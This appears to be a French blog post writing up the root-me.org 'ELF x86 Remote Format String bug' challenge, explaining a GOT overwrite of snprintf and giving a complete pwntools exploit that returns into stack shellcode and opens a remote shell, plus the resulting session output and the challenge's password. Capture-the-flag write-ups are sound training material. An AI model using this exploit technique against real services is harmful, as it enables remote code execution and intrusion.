---

layout: post  
title: "Challenge ELF x86 - Remote Format String bug, root-me.org"  
date: 2026-02-11 23:58:00 +0100  
categories: CTF

---

# Challenge ELF x86 - Remote Format String bug, root-me.org

https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x86-Remote-Format-String-bug

On récupère le binaire pour analyses ;  
scp -P 2222 app-systeme-ch32@challenge03.root-me.org:ch32 .  
J'ai aussi récupéré la libc du serveur, et patché le binaire pour l'utiliser en local (pwninit). D'où le ch32\_patched.

Un format string classique, on peut écrire où l'on veut assez facilement.  
Notre payload est assez proche dans la pile de l'adresse passée directement à sprintf, on remote vite à notre buffer, et de là on peut trouver l'adresse de notre choix pour y écrire.  
Reste à trouver comment obtenir un shell.. Le binaire est en 32 bits, pas de PIE, pas de ASLR, pas de NX. Ca va.  
Après quelques recherches, j'ai décidé de réutiliser le sprintf en écrasant son adresse dans la GOT.  
En effet il recoit directement l'adresse du buffer recu via recv().  
A la place de snprintf on fait sauter sur un gadget qui supprime les arguments superflus et on 'ret' dans notre shellcode sur la pile.  
0x08048b29: pop esi; pop edi; pop ebp; ret;

Le serveur semble chargé, il faut ajuster le délai entre send() et l'utilisation du shell.  
Et la connexion tcp est parfois instable.

> ➜ ch32-frmstring ./exploit.py REMOTE  
> \[+\] Opening connection to challenge02.root-me.org on port 56032: Done  
> \[_\] Closed connection to challenge02.root-me.org port 56032_  
> _\[+\] Opening connection to challenge02.root-me.org on port 56032: Done_  
> _\[_\] Switching to interactive mode  
> $ pwd;uname -a; cat /challenge/app-systeme/ch32/.passwd  
> /  
> Linux challenge02 5.4.0-150-generic # 167~18.04.1-Ubuntu SMP Wed May 24 00:51:14 UTC 2023 i686 i686 i686 > GNU/Linux  
> P+m{?|#~tOQJy") AX%\]AF3

```
mandragore, 20260212
```

```python
#!/usr/bin/env python3

from pwn import *
import sys
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'i386'
# context.terminal = ['tmux', 'splitw', '-h']

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./ch32_patched', checksec=False)
elf.address = 0x08046000
libc=ELF('./libc.so.6', checksec=False)
ld=ELF('./ld-linux.so.2', checksec=False)

if args.REMOTE:
    dest='challenge02.root-me.org'
else:
    dest='127.0.0.1'
    if args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
                set follow-fork-mode child
                set detach-on-fork off
#                break *0x0804882e
#                break snprintf
                continue
            ''')
    else:
        p = process(elf.path)

r = remote(dest, 56032)

shellcode  = shellcraft.dup2(4, 0)
shellcode += shellcraft.dup2(4, 1)
shellcode += shellcraft.dup2(4, 2)
shellcode += shellcraft.sh()
payload = asm(shellcode)

where=elf.got.snprintf
what=0x08048b29 # pop pop pop ret
r.sendline(p32(where)+b'%c%c%'+str(what-6).encode()+b'c%n')
r.clean(timeout=0.5)
r = remote(dest, 56032)
r.sendline(payload)
prog=log.progress("let the server load the shellcode...")
sleep(3)    # server chargé, il faut ajuster.
prog.success()
r.clean()
r.sendline(b'uname -a; cat /challenge/app-systeme/ch32/.passwd')
r.interactive()
```